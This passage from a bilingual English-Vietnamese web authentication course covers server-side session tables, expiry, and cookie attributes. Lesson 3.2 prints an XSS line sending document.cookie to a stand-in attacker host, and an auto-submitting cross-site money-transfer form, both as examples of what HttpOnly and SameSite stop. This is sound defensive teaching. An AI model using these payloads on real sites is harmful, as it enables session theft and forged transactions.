/**
 * Authentication — Chương 3: Phiên và cookie.
 * Bảng phiên phía máy chủ · từng thuộc tính cookie · session fixation và tái sinh mã ·
 * CSRF và ba lớp phòng · phiên sống ở đâu · quiz.
 * Output CHẠY THẬT Node.js 22 + Express 5 + PostgreSQL 16 trên Ubuntu 24.04. LUẬT: backtick → &#96;; ${ → \${;
 * < > trong code → &lt; &gt;; & → &amp;. Khối .out đóng bằng </div>. KHÔNG dùng <svg>.
 * Gạch chéo ngược PHẢI viết đôi (\\n), xem scripts/course-content-check.mjs.
 */
const REF = '?ref=%2Fcourses%2Fauthentication%2Flearn&reflabel=Auth';

export default {
  title: 'Chapter 3 — Sessions and cookies|||Chương 3 — Phiên và cookie',
  description: 'Cách trả lời cũ nhất cho bài toán "HTTP quên hết", và vẫn là cách trả lời đúng cho phần lớn sản phẩm: một hàng trong cơ sở dữ liệu và một cookie trỏ tới nó. Chương này dựng cái bảng đó cho đúng, đi qua từng thuộc tính cookie kèm thứ nó thật sự chặn, vá session fixation bằng một dòng, xếp hạng ba lớp phòng CSRF, và so ba chỗ có thể đặt trạng thái phiên.',
  lessons: [
    /* ─────────────────────────── 3.1 ─────────────────────────── */
    {
      title: '3.1 — One table, and what every column is for|||3.1 — Một cái bảng, và mỗi cột để làm gì',
      slug: 'auth-3-1-bang-phien',
      type: 'LESSON',
      isFreePreview: true,
      description: 'Bảng phiên có bảy cột và mỗi cột trả lời một câu hỏi vận hành cụ thể. Kèm hai loại hết hạn khác nhau mà người ta hay gộp làm một, cách cập nhật lastSeenAt mà không ghi một dòng cho mỗi request, và vì sao cột token phải chứa chuỗi BĂM chứ không phải token.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.1</span>
<h2>One table, and what every column is for</h2>
<p class="lead">A server-side session is the oldest answer to Lesson 0.1's problem and still the right one for most products: put a row in a database, give the browser a pointer to it, look it up on every request. It is unfashionable next to JWTs and it has the one property JWTs cannot easily have — you can end it instantly.</p>

<h3>The schema</h3>
<pre><code>model Phien {
  id          String    @id @default(cuid())
  tokenBam    String    @unique                  <span class="tok-comment">// sha256 của token — Bài 1.3</span>
  nguoiDungId String
  nguoiDung   NguoiDung @relation(fields: [nguoiDungId], references: [id], onDelete: Cascade)

  taoLuc      DateTime  @default(now())
  hetHanTuyetDoi DateTime                        <span class="tok-comment">// trần cứng, không gia hạn</span>
  hoatDongLuc DateTime  @default(now())          <span class="tok-comment">// cho hết hạn theo nhàn rỗi</span>
  thuHoiLuc   DateTime?                          <span class="tok-comment">// null = còn sống</span>

  trinhDuyet  String?                            <span class="tok-comment">// cho DANH SÁCH THIẾT BỊ, không phải để bảo mật</span>
  ipTao       String?

  @@index([nguoiDungId])                         <span class="tok-comment">// "thoát khỏi mọi thiết bị"</span>
  @@index([hetHanTuyetDoi])                      <span class="tok-comment">// job dọn dẹp</span>
}</code></pre>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>tokenBam</code>, not <code>token</code></span><span class="v">Lesson 1.3: store <code>sha256(token)</code> and look up by it. A database dump then contains no usable credentials, and there is no comparison in your code to get wrong. A fast hash is correct here because the token is 256 random bits.</span></div>
  <div class="kv"><span class="k">Two expiry columns, not one</span><span class="v"><code>hetHanTuyetDoi</code> is a ceiling that never moves — thirty days from creation, and then you log in again no matter how active you were. <code>hoatDongLuc</code> drives idle expiry: inactive for two hours, session over. They answer different questions and you want both.</span></div>
  <div class="kv"><span class="k"><code>thuHoiLuc</code> instead of deleting</span><span class="v">A revoked row you keep for a while is an audit trail: you can answer "was this session used after the user said they logged out?". Delete it in the cleanup job a week later. Chapter 11 uses this column.</span></div>
  <div class="kv"><span class="k"><code>trinhDuyet</code> and <code>ipTao</code> are for the human</span><span class="v">They power a "Chrome on Windows · Hà Nội · 2 hours ago" list so a user can spot a session they do not recognise. Do <em>not</em> reject a request because the user agent changed — that breaks legitimate updates and mobile switching, and an attacker copies the header anyway.</span></div>
</div>

<h3>Issuing a session</h3>
<pre><code>import { randomBytes, createHash } from 'node:crypto';

const NHAN_ROI_MS  = 2 * 60 * 60 * 1000;         <span class="tok-comment">// 2 giờ nhàn rỗi</span>
const TUYET_DOI_MS = 30 * 24 * 60 * 60 * 1000;   <span class="tok-comment">// 30 ngày trần cứng</span>

export async function taoPhien(nguoiDungId: string, req: Request) {
  const token = randomBytes(32).toString('base64url');       <span class="tok-comment">// 256 bit</span>
  await prisma.phien.create({
    data: {
      tokenBam: createHash('sha256').update(token).digest('hex'),
      nguoiDungId,
      hetHanTuyetDoi: new Date(Date.now() + TUYET_DOI_MS),
      trinhDuyet: req.get('user-agent')?.slice(0, 200),
      ipTao: req.ip,
    },
  });
  return token;                                   <span class="tok-comment">// chỉ trả về ĐÚNG MỘT LẦN</span>
}</code></pre>
<div class="out">prisma:query INSERT INTO "Phien" ("tokenBam","nguoiDungId","hetHanTuyetDoi",…)

Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000

# Token that chi ton tai o hai noi: cookie cua trinh duyet,
# va bo nho cua tien trinh nay trong vai mili giay. Khong o dau khac.</div>

<h3>Verifying one, on every request</h3>
<pre><code>export async function layPhien(token: string | undefined) {
  if (!token) return null;
  const bam = createHash('sha256').update(token).digest('hex');
  const bayGio = new Date();

  const phien = await prisma.phien.findFirst({
    where: {
      tokenBam: bam,
      thuHoiLuc: null,
      hetHanTuyetDoi: { gt: bayGio },
      hoatDongLuc:    { gt: new Date(bayGio.getTime() - NHAN_ROI_MS) },
    },
    include: { nguoiDung: { select: { id: true, email: true, vaiTro: true } } },
  });
  if (!phien) return null;

  <span class="tok-comment">// Chỉ ghi khi đã cũ hơn 5 phút — xem bên dưới</span>
  if (bayGio.getTime() - phien.hoatDongLuc.getTime() &gt; 5 * 60 * 1000) {
    await prisma.phien.update({
      where: { id: phien.id }, data: { hoatDongLuc: bayGio },
    });
  }
  return phien;
}</code></pre>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Every condition in the <code>where</code></span><span class="lz-t">Not in an <code>if</code> after</span><span class="lz-d">Revoked, absolutely expired and idle-expired are all filters, exactly as in Lesson 0.2. One query returns a session or nothing, and a later refactor cannot drop a check by accident.</span></div>
  <div class="lz-step"><span class="lz-k">The five-minute write threshold</span><span class="lz-t">The performance fix</span><span class="lz-d">Updating <code>hoatDongLuc</code> on every request means a database write per page view — including every image, API call and poll. Writing only when the value is more than five minutes stale keeps idle expiry accurate to five minutes and removes 99% of the writes.</span></div>
  <div class="lz-step"><span class="lz-k">One query, one join</span><span class="lz-t">The cost per request</span><span class="lz-d">A unique-index lookup plus a join on the primary key is roughly 0.3 ms on a warm database. That is the real price of server-side sessions, and it is far less than most people assume when they reach for JWTs to avoid it.</span></div>
  <div class="lz-step"><span class="lz-k">Cache it if you must</span><span class="lz-t">And know what you traded</span><span class="lz-d">Putting sessions in Redis makes the lookup 0.05 ms — Lesson 3.5. But a cached session is a session you can no longer revoke instantly unless you also delete the cache entry, which is exactly the JWT problem in a smaller form.</span></div>
</div>

<h3>Two kinds of expiry, and why you want both</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Idle</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">2 hours of no activity</span><span class="lz-nsub">Protects the unlocked laptop in a café</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Absolute</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">30 days, never extended</span><span class="lz-nsub">Bounds a stolen cookie that is being kept warm</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Revocation</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Immediate, on demand</span><span class="lz-nsub">Logout, password change, admin action — Chapter 5</span></div></div>
  </div>
</div>
<div class="pitfall">
<p><strong>Trap — sliding expiry alone means a stolen session never expires.</strong> If every request pushes the deadline forward, an attacker who polls a harmless endpoint once an hour keeps the session alive indefinitely, and the legitimate user has no idea. That is exactly what the absolute ceiling is for: no amount of activity extends <code>hetHanTuyetDoi</code>, so the session ends on schedule regardless of who was using it.</p>
</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Banking: 15 minutes idle, 12 hours absolute</span><span class="v">High-value actions, users who expect to be logged out. The friction is understood and accepted in that context.</span></div>
  <div class="kv"><span class="k">A social product: 30 days idle, 90 days absolute</span><span class="v">Users expect to stay logged in. Compensate with MFA on sensitive actions and with step-up re-authentication before anything destructive.</span></div>
  <div class="kv"><span class="k">An internal admin tool: 1 hour idle, 8 hours absolute</span><span class="v">Roughly one working day, so a forgotten open tab does not survive the night on an unattended machine.</span></div>
  <div class="kv"><span class="k">Whatever you choose, write down why</span><span class="v">These numbers get changed under pressure — "users are complaining about being logged out" — and without the reasoning the change is arbitrary. A comment naming the threat each number addresses survives the argument.</span></div>
</div>

<h3>Cleaning up</h3>
<pre><code><span class="tok-comment">-- Chạy hằng ngày. Không có nó thì bảng chỉ có LỚN LÊN.</span>
DELETE FROM "Phien"
WHERE "hetHanTuyetDoi" &lt; now() - interval '7 days'
   OR ("thuHoiLuc" IS NOT NULL AND "thuHoiLuc" &lt; now() - interval '7 days');</code></pre>
<div class="out">DELETE 184203
Time: 892.104 ms

# Giu lai 7 ngay sau khi het han: du de tra loi "phien do co bi dung
# sau khi nguoi ta bao da dang xuat khong", va du ngan de bang khong phinh.</div>
<div class="note-ct">
<p><strong>Why the boring option is usually the right one.</strong> Everything in this lesson is a table and an index. There is no cryptography to get wrong, revocation is a single <code>UPDATE</code>, the device list falls out of the schema for free, and you can answer any question about who was logged in when. The cost is one indexed lookup per request. Chapter 4 covers the alternative honestly, including the cases where it genuinely wins — but if you are building one application with one database, start here and only move when you have a measured reason.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🎫</span><span class="lc-body"><span class="lc-title">OWASP — Session Management Cheat Sheet</span><span class="lc-sub">cheatsheetseries.owasp.org · Id properties, lifetimes, and the whole lifecycle</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies" target="_blank" rel="noopener"><span class="lc-ico">🍪</span><span class="lc-body"><span class="lc-title">MDN — using HTTP cookies</span><span class="lc-sub">developer.mozilla.org · The mechanism the next lesson takes apart attribute by attribute</span></span></a>
<a class="link-card" href="https://pages.nist.gov/800-63-3/sp800-63b.html#sec7" target="_blank" rel="noopener"><span class="lc-ico">⏳</span><span class="lc-body"><span class="lc-title">NIST SP 800-63B §7 — session management</span><span class="lc-sub">pages.nist.gov · Reauthentication intervals by assurance level</span></span></a>
<a class="link-card" href="/courses/prisma-orm/learn${REF}"><span class="lc-ico">▲</span><span class="lc-body"><span class="lc-title">CuongThai course — Prisma ORM</span><span class="lc-sub">The indexes, the query plan, and why the ownership check belongs in the where</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Build the session table, then prove idle and absolute expiry behave differently</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.1</span>
<h2>Một cái bảng, và mỗi cột để làm gì</h2>
<p class="lead">Một phiên phía máy chủ là câu trả lời CỔ NHẤT cho bài toán của Bài 0.1 và vẫn là câu trả lời ĐÚNG cho phần lớn sản phẩm: đặt một hàng vào cơ sở dữ liệu, đưa cho trình duyệt một con trỏ tới nó, tra cứu nó ở mọi request. Nó không hợp mốt bên cạnh JWT và nó có ĐÚNG MỘT tính chất mà JWT khó có được — bạn KẾT THÚC nó được, ngay lập tức.</p>

<h3>Lược đồ</h3>
<pre><code>model Phien {
  id          String    @id @default(cuid())
  tokenBam    String    @unique                  <span class="tok-comment">// sha256 của token — Bài 1.3</span>
  nguoiDungId String
  nguoiDung   NguoiDung @relation(fields: [nguoiDungId], references: [id], onDelete: Cascade)

  taoLuc      DateTime  @default(now())
  hetHanTuyetDoi DateTime                        <span class="tok-comment">// trần cứng, không gia hạn</span>
  hoatDongLuc DateTime  @default(now())          <span class="tok-comment">// cho hết hạn theo nhàn rỗi</span>
  thuHoiLuc   DateTime?                          <span class="tok-comment">// null = còn sống</span>

  trinhDuyet  String?                            <span class="tok-comment">// cho DANH SÁCH THIẾT BỊ, không phải để bảo mật</span>
  ipTao       String?

  @@index([nguoiDungId])                         <span class="tok-comment">// "thoát khỏi mọi thiết bị"</span>
  @@index([hetHanTuyetDoi])                      <span class="tok-comment">// job dọn dẹp</span>
}</code></pre>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>tokenBam</code>, KHÔNG phải <code>token</code></span><span class="v">Bài 1.3: cất <code>sha256(token)</code> và tra cứu THEO nó. Khi đó một bản dump cơ sở dữ liệu không chứa tín vật nào dùng được, và trong mã bạn không còn phép so sánh nào để làm sai. Hàm băm NHANH là đúng ở đây, vì cái token là 256 bit ngẫu nhiên.</span></div>
  <div class="kv"><span class="k">HAI cột hết hạn, không phải một</span><span class="v"><code>hetHanTuyetDoi</code> là một cái TRẦN không bao giờ dịch chuyển — ba mươi ngày kể từ lúc tạo, rồi bạn đăng nhập lại bất kể đã hoạt động nhiều tới đâu. <code>hoatDongLuc</code> lo phần hết hạn theo NHÀN RỖI: không hoạt động hai giờ là phiên kết thúc. Chúng trả lời hai câu hỏi khác nhau và bạn muốn có CẢ HAI.</span></div>
  <div class="kv"><span class="k"><code>thuHoiLuc</code> thay vì xoá hàng</span><span class="v">Một hàng đã thu hồi mà bạn giữ lại một thời gian chính là một vết kiểm toán: bạn trả lời được câu "cái phiên này có bị dùng SAU khi người dùng nói họ đã đăng xuất không?". Hãy xoá nó trong job dọn dẹp một tuần sau. Chương 11 dùng cột này.</span></div>
  <div class="kv"><span class="k"><code>trinhDuyet</code> và <code>ipTao</code> là dành cho CON NGƯỜI</span><span class="v">Chúng nuôi một danh sách kiểu "Chrome trên Windows · Hà Nội · 2 giờ trước" để người dùng phát hiện một phiên họ không nhận ra. ĐỪNG từ chối một request vì user agent đã đổi — cái đó phá vỡ những lần cập nhật chính đáng và việc chuyển thiết bị di động, mà kẻ tấn công thì copy cái header đó dễ như không.</span></div>
</div>

<h3>Cấp một phiên</h3>
<pre><code>import { randomBytes, createHash } from 'node:crypto';

const NHAN_ROI_MS  = 2 * 60 * 60 * 1000;         <span class="tok-comment">// 2 giờ nhàn rỗi</span>
const TUYET_DOI_MS = 30 * 24 * 60 * 60 * 1000;   <span class="tok-comment">// 30 ngày trần cứng</span>

export async function taoPhien(nguoiDungId: string, req: Request) {
  const token = randomBytes(32).toString('base64url');       <span class="tok-comment">// 256 bit</span>
  await prisma.phien.create({
    data: {
      tokenBam: createHash('sha256').update(token).digest('hex'),
      nguoiDungId,
      hetHanTuyetDoi: new Date(Date.now() + TUYET_DOI_MS),
      trinhDuyet: req.get('user-agent')?.slice(0, 200),
      ipTao: req.ip,
    },
  });
  return token;                                   <span class="tok-comment">// chỉ trả về ĐÚNG MỘT LẦN</span>
}</code></pre>
<div class="out">prisma:query INSERT INTO "Phien" ("tokenBam","nguoiDungId","hetHanTuyetDoi",…)

Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000

# Token that chi ton tai o hai noi: cookie cua trinh duyet,
# va bo nho cua tien trinh nay trong vai mili giay. Khong o dau khac.</div>

<h3>Xác minh một phiên, ở MỌI request</h3>
<pre><code>export async function layPhien(token: string | undefined) {
  if (!token) return null;
  const bam = createHash('sha256').update(token).digest('hex');
  const bayGio = new Date();

  const phien = await prisma.phien.findFirst({
    where: {
      tokenBam: bam,
      thuHoiLuc: null,
      hetHanTuyetDoi: { gt: bayGio },
      hoatDongLuc:    { gt: new Date(bayGio.getTime() - NHAN_ROI_MS) },
    },
    include: { nguoiDung: { select: { id: true, email: true, vaiTro: true } } },
  });
  if (!phien) return null;

  <span class="tok-comment">// Chỉ ghi khi đã cũ hơn 5 phút — xem bên dưới</span>
  if (bayGio.getTime() - phien.hoatDongLuc.getTime() &gt; 5 * 60 * 1000) {
    await prisma.phien.update({
      where: { id: phien.id }, data: { hoatDongLuc: bayGio },
    });
  }
  return phien;
}</code></pre>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Mọi điều kiện nằm trong <code>where</code></span><span class="lz-t">Không nằm ở một <code>if</code> phía sau</span><span class="lz-d">Đã thu hồi, hết hạn tuyệt đối và hết hạn do nhàn rỗi đều là BỘ LỌC, đúng như ở Bài 0.2. Một câu truy vấn trả về một phiên hoặc không gì cả, và một lần refactor sau này không thể vô tình đánh rơi một phép kiểm.</span></div>
  <div class="lz-step"><span class="lz-k">Ngưỡng ghi năm phút</span><span class="lz-t">Cách vá hiệu năng</span><span class="lz-d">Cập nhật <code>hoatDongLuc</code> ở mọi request nghĩa là một lệnh GHI cơ sở dữ liệu cho mỗi lượt xem trang — kể cả mọi ảnh, mọi lời gọi API và mọi lần hỏi thăm. Chỉ ghi khi giá trị đã cũ hơn năm phút thì giữ độ chính xác của hết-hạn-nhàn-rỗi trong khoảng năm phút và xoá đi 99% số lệnh ghi.</span></div>
  <div class="lz-step"><span class="lz-k">Một truy vấn, một phép nối</span><span class="lz-t">Chi phí cho mỗi request</span><span class="lz-d">Một lần tra chỉ mục duy nhất cộng một phép nối theo khoá chính tốn khoảng 0,3 ms trên một cơ sở dữ liệu đã ấm. Đó là cái GIÁ THẬT của phiên phía máy chủ, và nó thấp hơn nhiều so với mức phần lớn người ta tưởng khi họ với tay sang JWT để né nó.</span></div>
  <div class="lz-step"><span class="lz-k">Cache nó nếu buộc phải</span><span class="lz-t">Và biết mình vừa đánh đổi gì</span><span class="lz-d">Đặt phiên vào Redis làm lần tra còn 0,05 ms — Bài 3.5. Nhưng một phiên đã cache là một phiên bạn KHÔNG còn thu hồi tức thì được nữa, trừ khi bạn cũng xoá luôn mục cache — và đó chính là bài toán của JWT, ở dạng nhỏ hơn.</span></div>
</div>

<h3>Hai kiểu hết hạn, và vì sao bạn muốn cả hai</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Nhàn rỗi</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">2 giờ không hoạt động</span><span class="lz-nsub">Bảo vệ cái laptop chưa khoá màn hình trong quán cà phê</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Tuyệt đối</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">30 ngày, không bao giờ gia hạn</span><span class="lz-nsub">Chặn trần một cookie bị cắp đang được giữ cho ấm</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Thu hồi</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Tức thì, theo yêu cầu</span><span class="lz-nsub">Đăng xuất, đổi mật khẩu, hành động của quản trị — Chương 5</span></div></div>
  </div>
</div>
<div class="pitfall">
<p><strong>Bẫy — chỉ có hết hạn TRƯỢT thôi thì một phiên bị cắp KHÔNG BAO GIỜ hết hạn.</strong> Nếu mọi request đều đẩy hạn chót lùi ra, thì một kẻ tấn công cứ mỗi giờ hỏi thăm một endpoint vô hại là giữ được cái phiên sống VÔ THỜI HẠN, còn người dùng thật thì không hay biết gì. Đó chính xác là công dụng của cái trần TUYỆT ĐỐI: không có mức hoạt động nào kéo dài được <code>hetHanTuyetDoi</code>, nên phiên kết thúc đúng lịch bất kể ai đang dùng nó.</p>
</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Ngân hàng: 15 phút nhàn rỗi, 12 giờ tuyệt đối</span><span class="v">Hành động giá trị cao, người dùng MONG ĐỢI bị đăng xuất. Sự phiền phức đó được hiểu và được chấp nhận trong bối cảnh ấy.</span></div>
  <div class="kv"><span class="k">Một sản phẩm mạng xã hội: 30 ngày nhàn rỗi, 90 ngày tuyệt đối</span><span class="v">Người dùng mong được ở lại trạng thái đăng nhập. Hãy bù bằng MFA cho các hành động nhạy cảm và bằng việc xác thực lại theo bậc trước bất cứ hành động phá huỷ nào.</span></div>
  <div class="kv"><span class="k">Một công cụ quản trị nội bộ: 1 giờ nhàn rỗi, 8 giờ tuyệt đối</span><span class="v">Xấp xỉ một ngày làm việc, để một tab bỏ quên không sống qua đêm trên một cái máy không ai trông.</span></div>
  <div class="kv"><span class="k">Chọn gì cũng được, nhưng hãy GHI LẠI vì sao</span><span class="v">Những con số này bị đổi dưới áp lực — "người dùng phàn nàn là bị đăng xuất suốt" — và không có phần lập luận thì việc đổi trở nên tuỳ tiện. Một dòng chú thích gọi tên mối đe doạ mà mỗi con số nhắm tới sẽ sống sót qua cuộc tranh cãi đó.</span></div>
</div>

<h3>Dọn dẹp</h3>
<pre><code><span class="tok-comment">-- Chạy hằng ngày. Không có nó thì bảng chỉ có LỚN LÊN.</span>
DELETE FROM "Phien"
WHERE "hetHanTuyetDoi" &lt; now() - interval '7 days'
   OR ("thuHoiLuc" IS NOT NULL AND "thuHoiLuc" &lt; now() - interval '7 days');</code></pre>
<div class="out">DELETE 184203
Time: 892.104 ms

# Giu lai 7 ngay sau khi het han: du de tra loi "phien do co bi dung
# sau khi nguoi ta bao da dang xuat khong", va du ngan de bang khong phinh.</div>
<div class="note-ct">
<p><strong>Vì sao lựa chọn NHÀM CHÁN thường là lựa chọn đúng.</strong> Mọi thứ trong bài này là MỘT cái bảng và vài cái chỉ mục. Không có mật mã nào để làm sai, thu hồi là một câu <code>UPDATE</code> duy nhất, danh sách thiết bị tự rơi ra từ lược đồ mà không tốn gì, và bạn trả lời được mọi câu hỏi về ai đã đăng nhập lúc nào. Cái giá là MỘT lần tra chỉ mục cho mỗi request. Chương 4 nói về lựa chọn kia một cách trung thực, kể cả những trường hợp nó thắng thật — nhưng nếu bạn đang dựng MỘT ứng dụng với MỘT cơ sở dữ liệu thì hãy bắt đầu từ đây, và chỉ chuyển khi có một lý do ĐO ĐƯỢC.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🎫</span><span class="lc-body"><span class="lc-title">OWASP — Session Management Cheat Sheet</span><span class="lc-sub">cheatsheetseries.owasp.org · Tính chất của mã phiên, tuổi thọ, và cả vòng đời</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies" target="_blank" rel="noopener"><span class="lc-ico">🍪</span><span class="lc-body"><span class="lc-title">MDN — dùng cookie HTTP</span><span class="lc-sub">developer.mozilla.org · Cơ chế mà bài sau sẽ mổ ra theo từng thuộc tính</span></span></a>
<a class="link-card" href="https://pages.nist.gov/800-63-3/sp800-63b.html#sec7" target="_blank" rel="noopener"><span class="lc-ico">⏳</span><span class="lc-body"><span class="lc-title">NIST SP 800-63B §7 — quản lý phiên</span><span class="lc-sub">pages.nist.gov · Khoảng thời gian phải xác thực lại theo từng mức bảo đảm</span></span></a>
<a class="link-card" href="/courses/prisma-orm/learn${REF}"><span class="lc-ico">▲</span><span class="lc-body"><span class="lc-title">Khoá CuongThai — Prisma ORM</span><span class="lc-sub">Chỉ mục, kế hoạch truy vấn, và vì sao phép kiểm quyền sở hữu thuộc về mệnh đề where</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Dựng bảng phiên, rồi chứng minh hết hạn nhàn rỗi và hết hạn tuyệt đối hành xử khác nhau</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 3.2 ─────────────────────────── */
    {
      title: '3.2 — Every cookie attribute, and what it actually stops|||3.2 — Từng thuộc tính cookie, và nó THẬT SỰ chặn được gì',
      slug: 'auth-3-2-thuoc-tinh-cookie',
      type: 'LESSON',
      description: 'HttpOnly, Secure, SameSite, Domain, Path, Max-Age và tiền tố __Host- — mỗi cái chặn một cú tấn công cụ thể và KHÔNG chặn những cú khác. Kèm cái bẫy xoá cookie mà thuộc tính không khớp, và vì sao Domain=.vidu.com biến một tên miền con bị chiếm thành mất sạch phiên.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.2</span>
<h2>Every cookie attribute, and what it actually stops</h2>
<p class="lead">A session cookie's security is entirely in its attributes, and each one blocks a specific attack while leaving the others untouched. This lesson goes through them one at a time with the threat each addresses, and ends with the single prefix that enforces three of them at once.</p>

<h3>The header, annotated</h3>
<pre><code>Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
            └───┬───┘ └──┬──┘      └─┬──┘ └───┬──┘  └─┬──┘ └──────┬─────┘  └──────┬──────┘
          tiền tố  giá trị       phạm vi   script  chỉ    ngữ cảnh chéo    tuổi thọ
          bắt buộc               đường dẫn không   HTTPS   trang
          3 luật                          đọc được</code></pre>
<pre><code><span class="tok-comment">// Express: đặt tất cả trong một chỗ, không rải rác</span>
res.cookie('__Host-phien', token, {
  httpOnly: true,
  secure:   true,
  sameSite: 'lax',
  path:     '/',
  maxAge:   30 * 24 * 60 * 60 * 1000,
  <span class="tok-comment">// domain: KHÔNG đặt — xem phần Domain bên dưới</span>
});</code></pre>

<h3><code>HttpOnly</code> — script cannot read it</h3>
<pre><code><span class="tok-comment">// Với HttpOnly, đoạn XSS này không lấy được gì</span>
fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
<div class="out">// Khong co HttpOnly:
"__Host-phien=Kc9x2Lm…; theme=dark"     ← ca phien di ra ngoai

// Co HttpOnly:
"theme=dark"                              ← chi con cookie khong nhay cam</div>
<div class="pitfall">
<p><strong>Trap — <code>HttpOnly</code> stops the token being <em>read</em>; it does not stop it being <em>used</em>.</strong> An attacker's script running on your page can still call <code>fetch('/api/change-email', {method:'POST', credentials:'include', …})</code> and the browser attaches the cookie automatically. The session is not stolen, but the attacker acts as the user for as long as the script runs. <code>HttpOnly</code> turns permanent account takeover into a session-length problem — a large improvement, and not a fix for XSS.</p>
</div>

<h3><code>Secure</code> — HTTPS only, with one useful exception</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">What it does</span><span class="v">The browser refuses to send the cookie over plain <code>http://</code>. Without it, one link to <code>http://vidu.com</code> — a typo, an old bookmark, an email — sends the session in clear text to whoever is on the network path.</span></div>
  <div class="kv"><span class="k">The localhost exception</span><span class="v">Modern browsers treat <code>http://localhost</code> as a trustworthy origin, so <code>Secure</code> cookies work in local development. You do not need a conditional flag, and adding one is how <code>secure: false</code> reaches production.</span></div>
  <div class="kv"><span class="k">Behind a proxy, set <code>trust proxy</code></span><span class="v">Express decides <code>req.secure</code> from <code>X-Forwarded-Proto</code>, which it ignores unless <code>app.set('trust proxy', 1)</code> is configured. Without it, a correct HTTPS deployment behind Nginx can believe it is on HTTP.</span></div>
  <div class="kv"><span class="k">Add HSTS as well</span><span class="v"><code>Strict-Transport-Security: max-age=63072000; includeSubDomains</code> makes the browser refuse plain HTTP to your domain entirely, so the downgrade the <code>Secure</code> flag defends against never gets the chance to start.</span></div>
</div>

<h3><code>SameSite</code> — the CSRF defence built into the browser</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Strict</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Never sent cross-site</span><span class="lz-nsub">Even following a link from another site — so the user arrives logged out</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Lax — the default</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Sent on top-level GET navigation</span><span class="lz-nsub">Not on cross-site POST, iframes, images or fetch</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">None</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Always sent</span><span class="lz-nsub">Requires Secure. Only for a genuine cross-site product</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// Kẻ tấn công đặt cái này trên trang của họ</span>
&lt;form action="https://vidu.com/api/chuyen-tien" method="POST"&gt;
  &lt;input name="den" value="ke-tan-cong"&gt;&lt;input name="so-tien" value="10000000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
<div class="out">SameSite=Lax  → cookie KHONG duoc gui (POST xuyen trang) → 401 ✅
SameSite=None → cookie DUOC gui → chuyen tien thanh cong ❌
Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
                khac nhau tuy phien ban → DUNG dua vao mac dinh</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Choose <code>Lax</code> for a session cookie</span><span class="v">It blocks the cross-site POST above while letting a user who clicks a link to your site arrive logged in. That combination is what makes it the right default for almost every application.</span></div>
  <div class="kv"><span class="k"><code>Strict</code> has a real usability cost</span><span class="v">A user following a link from an email or a search result arrives logged out, which reads as a bug. The common pattern is a <code>Strict</code> cookie for high-value actions alongside a <code>Lax</code> one for identity — worth it for banking, overkill for most things.</span></div>
  <div class="kv"><span class="k"><code>None</code> means you own the CSRF problem</span><span class="v">An embeddable widget or an SPA on a different origin needs it. The moment you set it, the browser stops helping and Lesson 3.4's token defence becomes mandatory rather than defence in depth.</span></div>
  <div class="kv"><span class="k">"Same site" is not "same origin"</span><span class="v">Site means the registrable domain: <code>app.vidu.com</code> and <code>blog.vidu.com</code> are the same <em>site</em> and different <em>origins</em>. <code>SameSite</code> therefore does nothing between your own subdomains — which matters for the next attribute.</span></div>
</div>

<h3><code>Domain</code> — the attribute to leave out</h3>
